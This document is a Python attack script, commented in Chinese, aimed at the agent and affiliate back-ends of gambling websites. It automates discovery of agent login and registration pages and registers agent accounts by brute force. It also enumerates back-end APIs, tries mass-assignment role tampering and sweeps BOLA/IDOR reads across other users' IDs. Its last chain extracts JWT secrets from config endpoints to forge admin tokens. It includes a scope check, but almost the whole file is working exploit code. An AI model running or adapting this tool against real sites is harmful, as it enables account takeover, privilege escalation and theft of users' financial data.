#!/usr/bin/env python3
"""博彩站代理商/渠道商账号体系探针。

博彩站账号体系（权限递增）：
  普通用户 < 代理商(agent/affiliate) < 运营商(operator) < admin

代理商注册入口几乎全部开放（需要拉人头），且代理商后台：
  · 往往不挂 Cloudflare（仅简单 HTTP 鉴权）
  · 可查所有下级用户余额/存取记录（IDOR 攻击面 ×10）
  · 往往可调用 addBonus/adjustBalance/出入金审核 API
  · 弱口令/JWT 比 admin 更容易撞

功能：
  discover  — 发现代理商注册/登录入口
  register  — 尝试注册代理商账号（无验证码时）
  api-enum  — 登录后枚举代理商平台 API
  level     — 枚举账号等级/权限体系

示例:
  python3 炼蛊房/agent_probe.py doctor
  python3 炼蛊房/agent_probe.py discover --base https://target.com --case <案卷>
  python3 炼蛊房/agent_probe.py register --base https://target.com --case <案卷>
  python3 炼蛊房/agent_probe.py api-enum --base https://agent.target.com \
    --token <登录后的token> --case <案卷>
"""
from __future__ import annotations

import argparse
import json
import random
import re
import string
import sys
import time
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

ENGINE = Path(__file__).resolve().parents[1]
OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope  # noqa: E402


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "agent"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if not h or h in ("127.0.0.1", "localhost"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] {h} 不在授权范围")


def rand_str(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def make_session(proxy_url: str = "") -> requests.Session:
    import requests as r
    s = r.Session()
    if proxy_url:
        s.proxies = {"http": proxy_url, "https": proxy_url}
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.9",
    })
    s.verify = False
    return s


# ─────────────────────────────────────────────
#  代理商入口路径字典（按框架分类）
# ─────────────────────────────────────────────
AGENT_PATHS = [
    # 通用
    "/agent", "/agent/", "/agent/login", "/agent/register",
    "/agent/index", "/agent/home",
    "/affiliate", "/affiliate/login", "/affiliate/register",
    "/partner", "/partner/login", "/partner/register",
    # 常见博彩 PHP 框架
    "/proxy", "/proxy/login", "/proxy/register", "/proxy/index.php",
    "/agentlogin", "/agentregister", "/agentcenter",
    "/agenthome", "/agentapi",
    # 后台子域模式（需在 discover 时也扫子域）
    "/agent-center", "/agent_center",
    "/distributor", "/distributor/login",
    "/reseller", "/reseller/login",
    # API 端点
    "/api/agent/login", "/api/agent/register", "/api/agent/info",
    "/api/v1/agent/login", "/api/v2/agent/login",
    "/v1/agent/login", "/v2/agent/login",
    # 运营商
    "/operator", "/operator/login", "/operator/register",
    "/op", "/op/login",
    # 中文路径
    "/daili", "/daili/login", "/daili/register",
    "/yongjin", "/jiesuan",
]

AGENT_SUBDOMAINS = [
    "agent", "affiliate", "partner", "proxy", "daili",
    "agent2", "agents", "aff", "a", "promo",
    "operator", "op", "oper",
    "reseller", "distributor",
]

# 代理商注册常见参数名
REG_PARAM_SETS = [
    # 方式 A：用户名+密码
    {"username": "agent_{rand}", "password": "Agent@{rand}!", "invite_code": ""},
    # 方式 B：手机号+密码
    {"phone": "1381234{rand6}", "password": "Agent@{rand}!", "type": "agent"},
    # 方式 C：邮箱+密码
    {"email": "agent_{rand}@proton.me", "password": "Agent@{rand}!", "role": "agent"},
    # 方式 D：带推荐人字段
    {"account": "agent_{rand}", "password": "Agent@{rand}!", "invite": "", "type": 2},
]

# 代理商后台常见 API 路径
AGENT_API_PATHS = [
    # 用户管理
    "/api/agent/users", "/api/agent/members", "/api/agent/downline",
    "/api/agent/subordinates", "/api/agent/children",
    # 财务
    "/api/agent/balance", "/api/agent/commission", "/api/agent/withdraw",
    "/api/agent/report", "/api/agent/finance",
    "/api/agent/profit", "/api/agent/settlement",
    # 操作
    "/api/agent/addMember", "/api/agent/createUser",
    "/api/agent/adjustBalance", "/api/agent/addBonus",
    "/api/agent/transfer",
    # 配置
    "/api/agent/config", "/api/agent/settings", "/api/agent/info",
    # 通用变体
    "/agentapi/members", "/agentapi/balance", "/agentapi/report",
    "/proxy/api/users", "/proxy/api/balance",
]


# ─────────────────────────────────────────────
#  命令实现
# ─────────────────────────────────────────────
def cmd_doctor(_: argparse.Namespace) -> int:
    if not REQUESTS_OK:
        print("[missing] requests: pip3 install requests")
        return 1
    print("[ok] requests available")
    print(f"[ok] {len(AGENT_PATHS)} agent paths in dictionary")
    print(f"[ok] {len(AGENT_SUBDOMAINS)} agent subdomain patterns")
    print("[ok] agent_probe ready")
    return 0


def cmd_discover(args: argparse.Namespace) -> int:
    """扫描代理商注册/登录入口（路径 + 子域）。"""
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    sess = make_session(args.proxy)
    found = []
    domain = host_of(base)

    # 1. 路径扫描
    print(f"[*] scanning {len(AGENT_PATHS)} agent paths on {base} …", flush=True)
    for path in AGENT_PATHS:
        url = base + path
        try:
            r = sess.get(url, timeout=args.timeout, allow_redirects=True)
            if r.status_code in (200, 302, 301) and len(r.content) > 200:
                entry = {
                    "url": url,
                    "status": r.status_code,
                    "len": len(r.content),
                    "title": _extract_title(r.text),
                    "type": _detect_type(r.text, url),
                }
                found.append(entry)
                print(f"  [{r.status_code}] {url}  title={entry['title']!r}  type={entry['type']}")
        except Exception:
            pass
        time.sleep(0.3)

    # 2. 子域探测
    print(f"\n[*] scanning {len(AGENT_SUBDOMAINS)} agent subdomains …", flush=True)
    base_domain = re.sub(r"^www\.", "", domain)
    for sub in AGENT_SUBDOMAINS:
        for prefix in (f"https://{sub}.{base_domain}", f"http://{sub}.{base_domain}"):
            try:
                r = sess.get(prefix, timeout=args.timeout, allow_redirects=True)
                if r.status_code in (200, 302) and len(r.content) > 200:
                    # 检查是否直接暴露（非 Cloudflare）
                    server = r.headers.get("Server", "")
                    cf = "CF-RAY" in r.headers or "cloudflare" in server.lower()
                    entry = {
                        "url": prefix,
                        "status": r.status_code,
                        "server": server,
                        "cloudflare": cf,
                        "title": _extract_title(r.text),
                        "type": _detect_type(r.text, prefix),
                    }
                    found.append(entry)
                    cf_mark = " [CF]" if cf else " ★直连"
                    print(f"  [{r.status_code}] {prefix}{cf_mark}  title={entry['title']!r}")
                    break
            except Exception:
                pass

    out = case_dir(args.case)
    out_json = out / "agent_discover.json"
    report = {"ts": _now(), "base": base, "found": found, "total": len(found)}
    out_json.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"\n[result] {len(found)} 入口 → {out_json}")
    if not found:
        print("[hint] 尝试 APK 逆向提取隐藏代理路径: python3 炼蛊房/apk_recon.py strings ...")
    return 0 if found else 1


def _extract_title(html: str) -> str:
    m = re.search(r"<title[^>]*>([^<]{1,100})</title>", html, re.I)
    return m.group(1).strip() if m else ""


def _detect_type(html: str, url: str) -> str:
    patterns = {
        "login_form": [r'type="password"', r'登录', r'login', r'sign in'],
        "register_form": [r'type="password".*type="password"', r'注册', r'register', r'sign up'],
        "api_json": [r'"code"', r'"status"', r'"message"', r'"data"'],
        "agent_panel": [r'代理', r'agent', r'affiliate', r'下级', r'佣金', r'commission'],
        "vue_react": [r'<div id="app"', r'<div id="root"', r'__vue__', r'__react'],
    }
    html_lower = html[:5000].lower()
    for t, pats in patterns.items():
        if any(re.search(p, html_lower) for p in pats):
            return t
    return "unknown"


def cmd_register(args: argparse.Namespace) -> int:
    """尝试注册代理商账号（自动填充并识别成功/失败）。"""
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    sess = make_session(args.proxy)

    # 先自动发现入口（如果没指定 register_url）
    reg_urls = [args.reg_url] if args.reg_url else []
    if not reg_urls:
        print("[*] auto-discovering register endpoint …", flush=True)
        for path in AGENT_PATHS:
            if "register" in path or "reg" in path.lower():
                reg_urls.append(base + path)

    rand = rand_str(6)
    success_entries = []

    for reg_url in reg_urls:
        print(f"\n[*] trying {reg_url}", flush=True)
        for param_set in REG_PARAM_SETS:
            params = {
                k: v.replace("{rand}", rand).replace("{rand6}", rand[-6:])
                for k, v in param_set.items()
            }
            # 尝试 JSON POST
            try:
                r = sess.post(reg_url, json=params, timeout=args.timeout)
                result = _parse_response(r)
                print(f"  [JSON] {r.status_code} → {result['summary']}")
                if result["success"]:
                    entry = {
                        "url": reg_url,
                        "params": params,
                        "response": result,
                        "token": result.get("token"),
                    }
                    success_entries.append(entry)
                    print(f"  ★ 注册成功！token={result.get('token','N/A')}")
            except Exception as exc:
                print(f"  [err] {exc}")
            # 尝试 FormData POST
            try:
                r = sess.post(reg_url, data=params, timeout=args.timeout)
                result = _parse_response(r)
                if result["success"] and reg_url + str(params) not in str(success_entries):
                    print(f"  [FORM] {r.status_code} → ★ 注册成功！")
                    success_entries.append({"url": reg_url, "params": params, "response": result})
            except Exception:
                pass
            time.sleep(0.5)

    out = case_dir(args.case)
    out_json = out / "agent_register.json"
    out_json.write_text(
        json.dumps({"ts": _now(), "base": base, "rand": rand, "successes": success_entries},
                   ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )
    print(f"\n[result] {len(success_entries)} 注册成功 → {out_json}")
    if success_entries:
        print("[next] 登录后跑 api-enum 枚举代理商平台 API")
    return 0 if success_entries else 1


def _parse_response(r: Any) -> dict:
    result: dict = {"status_code": r.status_code, "success": False, "token": None, "summary": ""}
    try:
        data = r.json()
        code = data.get("code", data.get("status", data.get("errno", -1)))
        msg = data.get("msg", data.get("message", data.get("errmsg", "")))
        token = (
            data.get("token") or data.get("access_token") or
            (data.get("data") or {}).get("token") or
            (data.get("data") or {}).get("access_token")
        )
        result["summary"] = f"code={code} msg={str(msg)[:80]}"
        result["token"] = token
        result["data"] = data
        # 判断是否成功
        success_codes = {0, 200, 1, "ok", "success", "OK", "SUCCESS", "0"}
        result["success"] = (
            str(code) in {str(s) for s in success_codes} or
            (r.status_code == 200 and token)
        )
    except Exception:
        result["summary"] = f"non-json len={len(r.content)}"
    return result


def cmd_api_enum(args: argparse.Namespace) -> int:
    """登录后枚举代理商后台所有 API 端点。"""
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    sess = make_session(args.proxy)
    if args.token:
        sess.headers["Authorization"] = f"Bearer {args.token}"
        sess.headers["X-Token"] = args.token
        sess.headers["token"] = args.token

    found_apis = []
    print(f"[*] enumerating {len(AGENT_API_PATHS)} agent API paths …", flush=True)
    for path in AGENT_API_PATHS:
        url = base + path
        try:
            r = sess.get(url, timeout=args.timeout)
            if r.status_code not in (404, 405):
                result = _parse_response(r)
                entry = {
                    "url": url,
                    "status": r.status_code,
                    "summary": result["summary"],
                    "data_preview": str(r.text[:200]),
                    "auth_required": r.status_code in (401, 403),
                }
                found_apis.append(entry)
                auth_mark = " [AUTH]" if entry["auth_required"] else " ★"
                print(f"  [{r.status_code}]{auth_mark} {url}")
                if not entry["auth_required"]:
                    print(f"    {result['summary']}")
        except Exception:
            pass
        time.sleep(0.2)

    open_apis = [a for a in found_apis if not a["auth_required"]]
    out = case_dir(args.case)
    out_json = out / "agent_api_enum.json"
    report = {
        "ts": _now(), "base": base,
        "total_checked": len(AGENT_API_PATHS),
        "found": len(found_apis),
        "open": len(open_apis),
        "apis": found_apis,
    }
    out_json.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"\n[result] 发现 {len(found_apis)} 个端点，{len(open_apis)} 个未鉴权 → {out_json}")
    for a in open_apis:
        print(f"  ★ {a['url']}")
    return 0


def cmd_level(args: argparse.Namespace) -> int:
    """尝试通过 API 参数篡改账号等级（Mass Assignment / 越权）。"""
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    sess = make_session(args.proxy)
    if args.token:
        sess.headers["Authorization"] = f"Bearer {args.token}"

    level_fields = [
        "level", "userLevel", "user_level", "memberLevel", "member_level",
        "agentLevel", "agent_level", "role", "userType", "user_type",
        "vipLevel", "vip_level", "grade",
    ]
    high_values = [2, 3, 5, 9, 10, 88, 99, 100, "agent", "admin", "operator", "vip"]

    found = []
    for endpoint in ["/api/user/update", "/api/member/update", "/api/user/profile",
                     "/api/user/edit", "/api/profile", "/api/me"]:
        url = base + endpoint
        for field in level_fields:
            for val in high_values:
                payload = {field: val}
                try:
                    r = sess.post(url, json=payload, timeout=args.timeout)
                    result = _parse_response(r)
                    if result["success"]:
                        found.append({"url": url, "field": field, "value": val, "response": result})
                        print(f"  ★ 等级篡改命中: {url} {field}={val}")
                except Exception:
                    pass
                time.sleep(0.2)

    out = case_dir(args.case)
    (out / "level_escalation.json").write_text(
        json.dumps({"ts": _now(), "hits": found}, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )
    print(f"[result] {len(found)} 个等级篡改命中")
    return 0 if found else 1


def cmd_bola(args: argparse.Namespace) -> int:
    """BOLA/IDOR：遍历其他代理商 UID，尝试越权读取数据。"""
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    sess = make_session(args.proxy)
    if args.token:
        sess.headers["Authorization"] = f"Bearer {args.token}"
        sess.headers["X-Token"] = args.token
        sess.headers["token"] = args.token

    # 越权目标端点（参数名 × 端点全排列）
    bola_endpoints = [
        ("/api/agent/users",       "agent_id"),
        ("/api/agent/members",     "agent_id"),
        ("/api/agent/report",      "uid"),
        ("/api/agent/report",      "agent_id"),
        ("/api/agent/balance",     "uid"),
        ("/api/agent/balance",     "agent_id"),
        ("/api/agent/commission",  "agent_id"),
        ("/api/agent/subordinates","agent_id"),
        ("/api/agent/info",        "uid"),
        ("/api/agent/info",        "agent_id"),
        ("/api/agent/settlement",  "agent_id"),
        ("/agentapi/report",       "uid"),
        ("/agentapi/members",      "agent_id"),
    ]

    hits = []
    uid_range = range(args.uid_start, args.uid_end + 1)
    print(f"[*] BOLA 测试: {len(bola_endpoints)} 端点 × {len(uid_range)} UID …")

    my_uid = args.my_uid
    for path, param in bola_endpoints:
        url = base + path
        for uid in uid_range:
            if my_uid and str(uid) == str(my_uid):
                continue  # 跳过自己
            try:
                r = sess.get(url, params={param: uid}, timeout=args.timeout)
                if r.status_code == 200:
                    result = _parse_response(r)
                    # 判断是否真的返回了其他用户数据（非空）
                    body = r.text
                    if (len(body) > 50 and
                            not any(w in body.lower() for w in
                                    ["no permission", "unauthorized", "forbidden",
                                     "not found", "error", "失败", "无权"])):
                        hit = {"url": url, "param": param, "uid": uid,
                               "status": r.status_code, "body": body[:200]}
                        hits.append(hit)
                        print(f"  ★ BOLA: {url}?{param}={uid} → HTTP 200  {body[:80]}")
            except Exception:
                pass
            time.sleep(0.1)

    out = case_dir(args.case)
    (out / "bola_result.json").write_text(
        json.dumps({"ts": _now(), "hits": hits}, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )
    print(f"\n[result] {len(hits)} 个 BOLA 命中 → {out / 'bola_result.json'}")
    return 0 if hits else 1


def cmd_priv_escalate(args: argparse.Namespace) -> int:
    """
    横向提权：从代理账号尝试获取更高权限。

    链路：
      1. 从 config/settings API 提取 JWT secret
      2. 用 secret 伪造 admin/operator JWT
      3. 测试 admin API 是否接受伪造 token
      4. 尝试 role 字段篡改（注册/更新时注入 admin role）
    """
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    sess = make_session(args.proxy)
    if args.token:
        sess.headers["Authorization"] = f"Bearer {args.token}"
        sess.headers["X-Token"] = args.token
        sess.headers["token"] = args.token

    findings = []

    # ── Step 1: 从 config API 提取 JWT secret / 敏感配置
    print("[Step 1] 提取配置信息（JWT secret / DB 连接串）…")
    config_paths = [
        "/api/agent/config", "/api/agent/settings", "/api/agent/systemconfig",
        "/api/config", "/api/settings", "/api/system/config",
        "/agentapi/config", "/api/v1/config",
    ]
    jwt_secrets = []
    for path in config_paths:
        try:
            r = sess.get(base + path, timeout=args.timeout)
            if r.status_code == 200 and len(r.text) > 20:
                body = r.text
                # 提取可能是 JWT secret 的字段
                for kw in ["secret", "jwt_secret", "token_key", "sign_key",
                           "key", "salt", "private_key", "app_secret"]:
                    m = re.search(rf'"{kw}"\s*:\s*"([^"{{}}]{6,})"', body, re.I)
                    if m:
                        jwt_secrets.append({"field": kw, "value": m.group(1), "source": path})
                        print(f"  ★ 发现疑似密钥: {kw} = {m.group(1)[:30]}…  来源: {path}")
                findings.append({"type": "config", "path": path, "body": body[:500]})
        except Exception:
            pass

    # ── Step 2: 尝试用提取到的 secret 伪造 admin JWT
    if jwt_secrets and args.token:
        print(f"\n[Step 2] 尝试用 {len(jwt_secrets)} 个候选密钥伪造 admin JWT …")
        try:
            import base64 as _b64
            # 解析现有 token 获取 header/payload 结构
            parts = args.token.split(".")
            if len(parts) == 3:
                # 补 padding
                pad = lambda s: s + "=" * (-len(s) % 4)
                existing_payload = json.loads(_b64.urlsafe_b64decode(pad(parts[1])))
                print(f"  现有 token payload: {existing_payload}")

                # 构造 admin payload
                admin_payload = dict(existing_payload)
                for k in ["role", "userType", "user_type", "level", "userLevel"]:
                    admin_payload[k] = "admin"
                admin_payload["uid"] = admin_payload.get("uid", 1)
                admin_payload["admin"] = True

                for secret_info in jwt_secrets:
                    secret = secret_info["value"]
                    try:
                        import jwt as pyjwt
                        forged = pyjwt.encode(admin_payload, secret, algorithm="HS256")
                        # 测试伪造 token
                        test_sess = make_session(args.proxy)
                        test_sess.headers["Authorization"] = f"Bearer {forged}"
                        test_sess.headers["token"] = forged
                        for admin_path in ["/api/admin/users", "/api/admin/list",
                                           "/admin/api/users", "/manage/api/users"]:
                            r = test_sess.get(base + admin_path, timeout=args.timeout)
                            if r.status_code == 200 and "user" in r.text.lower():
                                findings.append({
                                    "type": "jwt_forge_success",
                                    "secret": secret,
                                    "forged_token": forged[:60],
                                    "admin_path": admin_path,
                                    "response": r.text[:300],
                                })
                                print(f"  ★★ JWT 伪造成功！secret={secret[:20]}… path={admin_path}")
                    except ImportError:
                        print("  [!] pip install PyJWT 后可测试 JWT 伪造")
                    except Exception:
                        pass
        except Exception as e:
            print(f"  JWT 解析失败: {e}")

    # ── Step 3: 直接用代理 token 测试 admin 端点
    print("\n[Step 3] 用代理 token 直接测试 admin/operator 端点 …")
    admin_probe_paths = [
        "/api/admin/users", "/api/admin/members", "/api/admin/list",
        "/api/operator/users", "/api/operator/config",
        "/api/manage/users", "/api/manage/config",
        "/admin/api/users", "/manage/api/stats",
        "/api/v1/admin/users", "/api/v2/admin/users",
        "/api/sys/users", "/api/system/users",
    ]
    for path in admin_probe_paths:
        try:
            r = sess.get(base + path, timeout=args.timeout)
            if r.status_code == 200 and len(r.text) > 20:
                result = _parse_response(r)
                if result["success"] or "user" in r.text.lower():
                    findings.append({
                        "type": "direct_admin_access",
                        "path": path,
                        "status": r.status_code,
                        "body": r.text[:300],
                    })
                    print(f"  ★★ 代理 token 直接访问 admin API！{path}  HTTP {r.status_code}")
        except Exception:
            pass

    out = case_dir(args.case)
    (out / "priv_escalate.json").write_text(
        json.dumps({"ts": _now(), "findings": findings}, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )
    escalated = [f for f in findings if f["type"] in ("jwt_forge_success", "direct_admin_access")]
    print(f"\n[result] 发现 {len(escalated)} 个提权路径 → {out / 'priv_escalate.json'}")
    return 0 if escalated else 1


def main() -> int:
    p = argparse.ArgumentParser(description="博彩站代理商账号体系探针")
    sub = p.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("doctor")
    d.set_defaults(func=cmd_doctor)

    dsc = sub.add_parser("discover", help="发现代理商注册/登录入口")
    dsc.add_argument("--base", required=True, help="目标基础 URL")
    dsc.add_argument("--case", required=True)
    dsc.add_argument("--proxy", default="", help="HTTP/SOCKS5 代理 URL")
    dsc.add_argument("--timeout", type=float, default=10.0)
    dsc.set_defaults(func=cmd_discover)

    reg = sub.add_parser("register", help="尝试注册代理商账号")
    reg.add_argument("--base", required=True)
    reg.add_argument("--case", required=True)
    reg.add_argument("--reg-url", default="", help="指定注册 URL（可选）")
    reg.add_argument("--proxy", default="")
    reg.add_argument("--timeout", type=float, default=10.0)
    reg.set_defaults(func=cmd_register)

    ae = sub.add_parser("api-enum", help="枚举代理商后台 API")
    ae.add_argument("--base", required=True)
    ae.add_argument("--case", required=True)
    ae.add_argument("--token", default="", help="登录后的 Bearer Token")
    ae.add_argument("--proxy", default="")
    ae.add_argument("--timeout", type=float, default=10.0)
    ae.set_defaults(func=cmd_api_enum)

    lv = sub.add_parser("level", help="账号等级越权篡改")
    lv.add_argument("--base", required=True)
    lv.add_argument("--case", required=True)
    lv.add_argument("--token", default="")
    lv.add_argument("--proxy", default="")
    lv.add_argument("--timeout", type=float, default=10.0)
    lv.set_defaults(func=cmd_level)

    bo = sub.add_parser("bola", help="BOLA/IDOR：遍历代理商 UID 越权读取数据")
    bo.add_argument("--base", required=True)
    bo.add_argument("--case", required=True)
    bo.add_argument("--token", default="")
    bo.add_argument("--uid-start", type=int, default=1, help="起始 UID")
    bo.add_argument("--uid-end",   type=int, default=100, help="结束 UID")
    bo.add_argument("--my-uid",    default="", help="自己的 UID（跳过自身）")
    bo.add_argument("--proxy", default="")
    bo.add_argument("--timeout", type=float, default=10.0)
    bo.set_defaults(func=cmd_bola)

    pe = sub.add_parser("priv-escalate", help="代理账号横向提权到 Admin（JWT 密钥提取/伪造）")
    pe.add_argument("--base", required=True)
    pe.add_argument("--case", required=True)
    pe.add_argument("--token", required=True, help="代理账号 token")
    pe.add_argument("--proxy", default="")
    pe.add_argument("--timeout", type=float, default=10.0)
    pe.set_defaults(func=cmd_priv_escalate)

    args = p.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
